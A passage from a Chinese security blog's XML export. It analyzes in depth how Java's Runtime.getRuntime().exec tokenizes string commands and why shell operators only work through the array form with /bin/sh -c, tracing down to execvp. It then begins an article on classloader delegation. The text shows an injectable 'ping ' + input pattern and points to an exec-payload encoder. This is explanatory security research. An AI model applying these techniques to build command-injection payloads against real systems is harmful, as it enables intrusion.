      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Runtime.getRuntime().exec由表及里</title>
    <url>/2020/01/11/Java-Runtime-getRuntime-exec%E7%94%B1%E8%A1%A8%E5%8F%8A%E9%87%8C/</url>
    <content><![CDATA[<!-- 这篇文章主要目的在于学习前人文章，并从更深入一点的角度探讨为什么Runtime.getRuntime().exec某些时候会失效这个问题。 -->
<!-- more -->
<p>本文发在<a href="https://xz.aliyun.com/t/7046">先知社区</a>，转载到自己博客上。</p>
<h2 id="问题复现">问题复现</h2>
<p>测试代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">linux_cmd1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;cmd which you want to exec&quot;</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看看可以成功的情况<br>
<img src="1577676465197-1f34563e-7443-4f6c-9238-c0137558519e.png#align=left&amp;display=inline&amp;height=232&amp;name=image.png&amp;originHeight=464&amp;originWidth=2472&amp;size=112349&amp;status=done&amp;style=none&amp;width=1236" alt="image.png"></p>
<p>再来看看不能成功的情况<br>
<img src="1577676563293-bef3ec10-84d5-4aa5-95b7-bec57b95d23e.png#align=left&amp;display=inline&amp;height=160&amp;name=image.png&amp;originHeight=320&amp;originWidth=2354&amp;size=88578&amp;status=done&amp;style=none&amp;width=1177" alt="image.png"></p>
<p>这里 <code>&amp;&amp;</code> 并没有达到bash中的效果<br>
<img src="1577676687805-0c7e43fb-9d1d-4aa8-8ef6-7331003c1499.png#align=left&amp;display=inline&amp;height=82&amp;name=image.png&amp;originHeight=122&amp;originWidth=1110&amp;size=51524&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>如果以前有人问我为什么会出现这种，我会毫不犹豫的回答：<em>因为 <code>Runtime.getRuntime().exec</code>   执行命令的时候并没有shell上下文环境所以无法把类似于 <code>&amp;</code> <code>|</code> 这样的符号进行特殊处理。</em></p>
<h2 id="解决方法">解决方法</h2>
<p>解决这种问题的方法有两种<br>
第一种就是对执行命令进行编码，<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">编码地址在这</a></p>
<p><img src="1577679919272-65599375-f5c5-4dd0-99fb-eae32d71c6fe.png#align=left&amp;display=inline&amp;height=378&amp;name=image.png&amp;originHeight=646&amp;originWidth=1274&amp;size=50358&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
<img src="1577679973496-15f40fac-cdbc-48c5-a23c-63385bf3775e.png#align=left&amp;display=inline&amp;height=162&amp;name=image.png&amp;originHeight=324&amp;originWidth=3298&amp;size=104504&amp;status=done&amp;style=none&amp;width=1649" alt="image.png"></p>
<p>第二种就是使用数组的形式命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] command = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo 2333 2333 2333 &amp;&amp; echo 2333 2333 2333&quot;</span> &#125;;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br></pre></td></tr></table></figure>
<p><img src="1577680147954-a2e442b8-dd8c-42c4-a578-41d879554491.png#align=left&amp;display=inline&amp;height=229&amp;name=image.png&amp;originHeight=458&amp;originWidth=2918&amp;size=146723&amp;status=done&amp;style=none&amp;width=1459" alt="image.png"></p>
<p>至此从实战应用的角度这个问题已经解决了。</p>
<p>不过我们可以看到其实这第二种方法用到了 <code>&amp;</code> 上面 _Runtime.getRuntime().exec执行命令的时候并没有shell上下文环境所以无法把类似于 <code>&amp;</code> <code>|</code> <em><code>_</code></em>` _这样的符号特殊处理。_这一结论似乎看起来并站不住脚?</p>
<p>下面来跟踪一下源码，看看到底发生了什么。</p>
<h2 id="源码分析">源码分析</h2>
<h3 id="当传入Runtime-getRuntime-exec的是字符串">当传入Runtime.getRuntime().exec的是字符串</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">linux_cmd1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;echo 2333 &amp;&amp; echo 2333&quot;</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为传入的命令是String类型，所以进入 <code>java.lang.Runtime#exec(java.lang.String, java.lang.String[], java.io.File)</code>  。<strong>这里是第一个非常关键的点， <code>StringTokenizer</code> 会把传入的conmmand字符串按 <code>\t \n \r \f</code> 中的任意一个分割成数组cmdarray。</strong></p>
<p><img src="1577685833249-067f99be-c43e-4564-a18f-a47a6856861a.png#align=left&amp;display=inline&amp;height=211&amp;name=image.png&amp;originHeight=422&amp;originWidth=2766&amp;size=176007&amp;status=done&amp;style=none&amp;width=1383" alt="image.png"><br>
<img src="1577686182902-31dc960d-5d35-42a5-8803-079771cf19b3.png#align=left&amp;display=inline&amp;height=186&amp;name=image.png&amp;originHeight=228&amp;originWidth=916&amp;size=22796&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>代码来到exec的多态实现 <code>java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)</code> ，exec内部调用了ProcessBuilder的start。<br>
<img src="1577686458188-5644d174-4a9f-4a06-a666-eb66296ce4d5.png#align=left&amp;display=inline&amp;height=130&amp;name=image.png&amp;originHeight=260&amp;originWidth=1816&amp;size=61763&amp;status=done&amp;style=none&amp;width=908" alt="image.png"></p>
<p>ProcessBuilder.start内部又调用了ProcessImpl.start。<br>
<img src="1577686661547-d787e724-269b-4a25-95c6-1a87412d7e97.png#align=left&amp;display=inline&amp;height=127&amp;name=image.png&amp;originHeight=254&amp;originWidth=2602&amp;size=71237&amp;status=done&amp;style=none&amp;width=1301" alt="image.png"></p>
<p>在ProcessImpl.start中有<strong>第二个非常关键的点我们可以看到程序把cmdarray第一个参数（cmdarray[0]）当成要执行的命令，把其后的部分（cmdarray[1:]）作为命令的参数转换成byte 数组 argBlock（具体规则是以\x00进行implode）。</strong><br>
<img src="1577687523856-aadd2b68-7973-4b49-a857-d554004c8f6e.png#align=left&amp;display=inline&amp;height=487&amp;name=image.png&amp;originHeight=974&amp;originWidth=2514&amp;size=281837&amp;status=done&amp;style=none&amp;width=1257" alt="image.png"></p>
<p>ProcessImpl.start最后又会把处理好的参数传入UNIXProcess<br>
<img src="1577686887031-96670a59-cdca-4cf1-ad79-ee82474a18bb.png#align=left&amp;display=inline&amp;height=156&amp;name=image.png&amp;originHeight=312&amp;originWidth=2602&amp;size=86125&amp;status=done&amp;style=none&amp;width=1301" alt="image.png"></p>
<p>UNIXProcess内部又调用了forkAndExec方法<br>
<img src="1577688234642-21446af8-71dc-42ef-a9a4-d4f549399445.png#align=left&amp;display=inline&amp;height=312&amp;name=image.png&amp;originHeight=624&amp;originWidth=2776&amp;size=186773&amp;status=done&amp;style=none&amp;width=1388" alt="image.png"></p>
<p>这里的是forkAndExec是一个native方法。<br>
<img src="1577686970789-da810849-80d9-4eb2-b107-7bb1ce933b0f.png#align=left&amp;display=inline&amp;height=155&amp;name=image.png&amp;originHeight=310&amp;originWidth=1994&amp;size=74399&amp;status=done&amp;style=none&amp;width=997" alt="image.png"></p>
<p>从变量的命名来看，在开发者的眼中prog是要执行的命令即 <code>echo</code> ，argBlock都是传给 <code>echo</code> 的参数即<code>2333\x00&amp;&amp;\x002333</code>且传给 <code>echo</code> 的参数个数argc是4<br>
可见经过StringTokenizer对字符串中空格类的处理其实是一种java对命令执行的保护机制，他可以防御以下这种命令注入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;ping &quot;</span> + 可控点;</span><br><span class="line">Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure>
<p>补一个完整的调用栈。<img src="1577687207316-a29ab55a-281b-4cd5-b8df-d35c5038dbb5.png#align=left&amp;display=inline&amp;height=200&amp;name=image.png&amp;originHeight=288&amp;originWidth=1076&amp;size=49512&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<h3 id="当传入Runtime-getRuntime-exec的是字符串数组">当传入Runtime.getRuntime().exec的是字符串数组</h3>
<p>我们再来看看给Runtime传入数组的时候是什么情况。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">linux_cmd1</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> throws IOException </span>&#123;</span><br><span class="line">        String[] command = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo 2333 &amp;&amp; echo 2333&quot;</span> &#125;;</span><br><span class="line">        InputStream in = Runtime.<span class="built_in">getRuntime</span>().<span class="built_in">exec</span>(command).<span class="built_in">getInputStream</span>();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> <span class="built_in">ByteArrayOutputStream</span>();</span><br><span class="line">        byte[] b = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> a = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.<span class="built_in">read</span>(b)) != <span class="number">-1</span>) &#123;</span><br><span class="line">            baos.<span class="built_in">write</span>(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="keyword">new</span> <span class="built_in">String</span>(baos.<span class="built_in">toByteArray</span>()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为这里传入的数组，所以并没有经StringTokenizer对字符串的分割处理这一步而是直接进入了。<code>java.lang.Runtime#exec(java.lang.String[])</code> 。<br>
<img src="1577689013179-27759f7d-39b7-453c-883c-674de2de614d.png#align=left&amp;display=inline&amp;height=75&amp;name=image.png&amp;originHeight=150&amp;originWidth=2222&amp;size=51052&amp;status=done&amp;style=none&amp;width=1111" alt="image.png"></p>
<p>后面的流程和字符串的情形是一致的，最后来到forkAndExec<br>
<img src="1577689204761-132deaef-3c15-4894-8d8f-bc307ff0de8e.png#align=left&amp;display=inline&amp;height=318&amp;name=image.png&amp;originHeight=636&amp;originWidth=2828&amp;size=191238&amp;status=done&amp;style=none&amp;width=1414" alt="image.png"></p>
<p>按照上面的说法这里 <code>/bin/bash</code> 是要执行的命令， <code>-c\x00&quot;echo 2333 &amp;&amp; echo 23333&quot;</code> 是传给的 <code>/bin/bash</code> 的参数。</p>
<p>补一个调用栈<br>
<img src="1577891037047-1a96c772-57d2-4476-93b4-3460b8ea60b1.png#align=left&amp;display=inline&amp;height=129&amp;name=image.png&amp;originHeight=258&amp;originWidth=1074&amp;size=43587&amp;status=done&amp;style=none&amp;width=537" alt="image.png"></p>
<h3 id="一个错误的想法">一个错误的想法</h3>
<p>看到这里不知道你是不是有点晕，心底生出了疑问，在执行字符串的时候加上 <code>/bin/bash</code> 不就好了。像下面这样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">linux_cmd1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;/bin/bash -c &#x27;echo 2333 &amp;&amp; echo 2333&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行试试看，发现什么结果都没有，推测应该是shell执行命令失败了。<br>
<img src="1577690492437-eb933d61-d2b5-4175-94e8-2707f0a04a80.png#align=left&amp;display=inline&amp;height=302&amp;name=image.png&amp;originHeight=604&amp;originWidth=2076&amp;size=124786&amp;status=done&amp;style=none&amp;width=1038" alt="image.png"></p>
<p>为什么会失败呢？我们来diff一下和数组执行最后进native的层的区别。<br>
<img src="1577695145401-bada57bf-0499-4f8c-b33f-1d240cd142af.png#align=left&amp;display=inline&amp;height=774&amp;name=image.png&amp;originHeight=1548&amp;originWidth=2786&amp;size=270657&amp;status=done&amp;style=none&amp;width=1393" alt="image.png"><br>
可以看到prog都是 <code>/bin/bash</code> 但是字符串模式下执行的参数变成了 <code>-c\x00'echo\x002333\x00&amp;&amp;\x00echo\x002333'</code> ，对比数组模式 <code>-c\x00&quot;echo 2333 &amp;&amp; echo 23333&quot;</code> 。可以发现字符串模式下因为<code>StringTokenizer</code>对字符串空格类字符的处理<strong>破坏了命令执行的语义</strong>。</p>
<p>如果再仔细看看会发现字符串模式argc为6而数组模式只有2。写到这里其实我还想钻以下牛角尖，凭什么6个参数最后就不能执行？</p>
<h3 id="进入jvm看看">进入jvm看看</h3>
<p>带着这样的疑问，我自不量力的编译了java源码并现学了一下怎么调试jvm（调试的环境是ubuntu14.04+jdk8）下面是学习成果。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] command = &#123; <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo 2333 &amp;&amp; echo 2333&quot;</span> &#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据java native函数命名规则可以知道forkAndExec对应的c函数是 <code>Java_java_lang_UNIXProcess_forkAndExec</code>  。<br>
<img src="1577891334880-c3954fc0-353f-4e3a-93d2-c05a22a1805b.png#align=left&amp;display=inline&amp;height=762&amp;name=image.png&amp;originHeight=1524&amp;originWidth=1826&amp;size=284743&amp;status=done&amp;style=none&amp;width=913" alt="image.png"></p>
<p>这个函数初始化执行命令所需要一些变量（如输入输出错误流）以及提取并处理java传入进来的参数，最后调用startChild函数开启子进程。</p>
<p><img src="1577803126319-c17c1625-54d4-4a06-b2f4-f3e2d69f0912.png#align=left&amp;display=inline&amp;height=738&amp;name=image.png&amp;originHeight=1476&amp;originWidth=2068&amp;size=1476544&amp;status=done&amp;style=none&amp;width=1034" alt="image.png"></p>
<p>startChild会根据是mode的数值不同进入不同的分支，mode由操作系统、libc版本决定。<br>
<img src="1577891592795-27719e34-85b1-49fb-94b9-6fbbb4bd7a4b.png#align=left&amp;display=inline&amp;height=640&amp;name=image.png&amp;originHeight=1280&amp;originWidth=1956&amp;size=187639&amp;status=done&amp;style=none&amp;width=978" alt="image.png"></p>
<p>我这里进入了vforkChild，vforkChild会使用vfork开启一个子进程，并且在子进程内部调用了childProcess，在clion中为了调试进入子进程需要在进入之前在gdb调试框输入 <code>set follow-fork-mode child</code>  和 <code>set detach-on-fork off</code> <br>
<img src="1577886759874-01492158-3589-42ae-8468-8ba3629cc2bc.png#align=left&amp;display=inline&amp;height=744&amp;name=image.png&amp;originHeight=1488&amp;originWidth=1922&amp;size=234923&amp;status=done&amp;style=none&amp;width=961" alt="image.png"></p>
<p>childProcess中调用JDK_execvpe。<br>
<img src="1577892301729-741292b7-cee1-4ed8-9ce9-72fec7fc5783.png#align=left&amp;display=inline&amp;height=685&amp;name=image.png&amp;originHeight=1370&amp;originWidth=1596&amp;size=183821&amp;status=done&amp;style=none&amp;width=798" alt="image.png"><br>
JDK_execvpe最后调用系统execvp函数，我们来细一看传参情况。</p>
<p><img src="1577886891144-925b1102-3c6f-4752-b0ba-b5b94d1def00.png#align=left&amp;display=inline&amp;height=452&amp;name=image.png&amp;originHeight=904&amp;originWidth=1838&amp;size=123585&amp;status=done&amp;style=none&amp;width=919" alt="image.png"></p>
<p><img src="1577887135995-42990dc8-ec02-401e-9213-eddf7e418801.png#align=left&amp;display=inline&amp;height=213&amp;name=image.png&amp;originHeight=356&amp;originWidth=1246&amp;size=39821&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p><img src="1577887148131-a6992150-ab3e-4e82-a93c-c5927f254965.png#align=left&amp;display=inline&amp;height=177&amp;name=image.png&amp;originHeight=292&amp;originWidth=1230&amp;size=31775&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p><img src="1577887164428-ce737fbd-2e40-4702-820a-d45b23fa2954.png#align=left&amp;display=inline&amp;height=212&amp;name=image.png&amp;originHeight=354&amp;originWidth=1244&amp;size=39562&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>故数组情况下等价于<br>
<img src="1577774188360-408cc7a4-bffe-4360-a859-f6e5b6b20a4f.png#align=left&amp;display=inline&amp;height=310&amp;name=image.png&amp;originHeight=620&amp;originWidth=2246&amp;size=111327&amp;status=done&amp;style=none&amp;width=1123" alt="image.png"></p>
<p>那么我们再来考察一下，字符串的情况的情况。<br>
<img src="1577892353386-8b9d3cb5-d1a0-4c85-bd25-555f2dc45f04.png#align=left&amp;display=inline&amp;height=123&amp;name=image.png&amp;originHeight=202&amp;originWidth=1226&amp;size=21350&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
<img src="1577892370784-45fd9581-4a77-41b5-99c3-70031f64f1f0.png#align=left&amp;display=inline&amp;height=121&amp;name=image.png&amp;originHeight=200&amp;originWidth=1228&amp;size=21627&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
<img src="1577892391866-8b0b4576-a0c0-403b-8c41-13a8848e700b.png#align=left&amp;display=inline&amp;height=116&amp;name=image.png&amp;originHeight=192&amp;originWidth=1234&amp;size=22711&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
<img src="1577892410406-82bd1a5c-7106-4077-ac07-fa9cb05d972b.png#align=left&amp;display=inline&amp;height=120&amp;name=image.png&amp;originHeight=190&amp;originWidth=1182&amp;size=21050&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
<img src="1577892490628-2810628a-be2b-4db9-90e9-2845970634e4.png#align=left&amp;display=inline&amp;height=114&amp;name=image.png&amp;originHeight=184&amp;originWidth=1206&amp;size=20774&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
<img src="1577892526498-a9e7e761-b5af-452f-82db-cf194e00d3bf.png#align=left&amp;display=inline&amp;height=114&amp;name=image.png&amp;originHeight=190&amp;originWidth=1244&amp;size=22425&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
<img src="1577892558443-d47b918c-5559-47e7-b68b-8af7db6aec8e.png#align=left&amp;display=inline&amp;height=123&amp;name=image.png&amp;originHeight=202&amp;originWidth=1230&amp;size=22185&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>故字符串模式等价于</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *arg[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;&#x27;echo&quot;</span>, <span class="string">&quot;2333&quot;</span>, <span class="string">&quot;&amp;&amp;&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;2333&#x27;&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="built_in">execvp</span>(arg[<span class="number">0</span>],(<span class="type">char</span> **) arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="1577774099636-86487450-9203-4284-ba2c-d16a7e1297c8.png#align=left&amp;display=inline&amp;height=326&amp;name=image.png&amp;originHeight=652&amp;originWidth=2692&amp;size=136647&amp;status=done&amp;style=none&amp;width=1346" alt="image.png"></p>
<p>所以整个调用链如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.Runtime.exec(cmd);</span><br><span class="line">-&gt;java.lang.ProcessBuilder.start();</span><br><span class="line">--&gt;java.lang.ProcessImpl.start();</span><br><span class="line">---&gt;Java_java_lang_UNIXProcess_forkAndExec() in j2se/src/solaris/native/java/lang/UNIXProcess_md.c</span><br><span class="line">----&gt;fork或VFORK或POSIX_SPAWN</span><br><span class="line">-----&gt;execvp();</span><br></pre></td></tr></table></figure>
<h2 id="结论">结论</h2>
<p>_Runtime.getRuntime().exec执行命令的时候并没有shell上下文环境所以无法把类似于 <code>&amp;</code> <code>|</code> <em><code>_</code></em><code>_这样的符号特殊处理_的本质是execvp也确实不支持shell中的特殊符号。而之所以数组情况能成是因为execvp调用了</code>/bin/bash<code> ，</code>/bin/bash<code> 解释了 </code>&amp;<code> , </code>|` 这些特殊符号和execvp没关系。</p>
<h2 id="参考">参考</h2>
<p><a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Java下奇怪的命令执行</a><br>
<a href="https://mp.weixin.qq.com/s/zCe_O37rdRqgN-Yvlq1FDg">在 Runtime.getRuntime().exec(String cmd) 中执行任意shell命令的几种方法</a><br>
<a href="https://www.cnblogs.com/LittleHann/p/4326828.html">Java JVM、JNI、Native Function Interface、Create New Process Native Function API Analysis</a><br>
<a href="https://stackoverflow.com/questions/36221038/how-to-debug-a-forked-child-process-using-clion">How to debug a forked child process using CLion</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中双亲委派相关知识梳理</title>
    <url>/2020/01/22/Java%E4%B8%AD%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</url>
    <content><![CDATA[<!-- 在反序列化的学习过程中总是不可回避碰到这个点，这次就来简单看看。 -->
<!-- more -->
<h2 id="classloader介绍">classloader介绍</h2>
<p>在java中每当需要加载一个类的时候，就需要用到类加载器（classloader），它存在的意义在于把class文件中字节码变成可以被java使用的class对象。java中原生自带3个classloader分别是Bootstrap ClassLoader、Ext ClassLoader、App ClassLoader另外用户也可以自定义Custom ClassLoader。那实际加载类的时候是用哪一个加载器？java为了安全着想规定了classloader之间有一套等级机制。<strong>具体来说就是：当从子加载器出发，但子加载器加载class的时候会先委派给由父加载器先加载，如果父加载器无法加载再由子加载器加载，而这套先后顺序就是平时所说的双亲委派</strong>。</p>
<p><img src="1579506416646-166ccd99-ce6c-45d5-a303-192216a575ed.png#align=left&amp;display=inline&amp;height=503&amp;name=image.png&amp;originHeight=294&amp;originWidth=436&amp;size=49254&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<ul>
<li>
<p>BootstrapClassLoader，启动类加载器/根加载器，负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.<em>.</em> 都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。</p>
</li>
<li>
<p>ExtClassLoader，扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，库名通常以 javax 开头。</p>
</li>
<li>
<p>AppClassLoader，应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载 ClASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者代码中、第三方库中的类。</p>
</li>
</ul>
<p>容易误会的一点是Classloader之间并不是继承关系而是组合。<br>
<img src="1579509377078-045bf8a3-1a58-4f33-9d95-e3ef2d06c03a.png#align=left&amp;display=inline&amp;height=308&amp;name=image.png&amp;originHeight=616&amp;originWidth=1518&amp;size=119384&amp;status=done&amp;style=none&amp;width=759" alt="image.png"></p>
<p>AppClassLoader和ExtClassLoader都继承自URLClasLoader。<br>
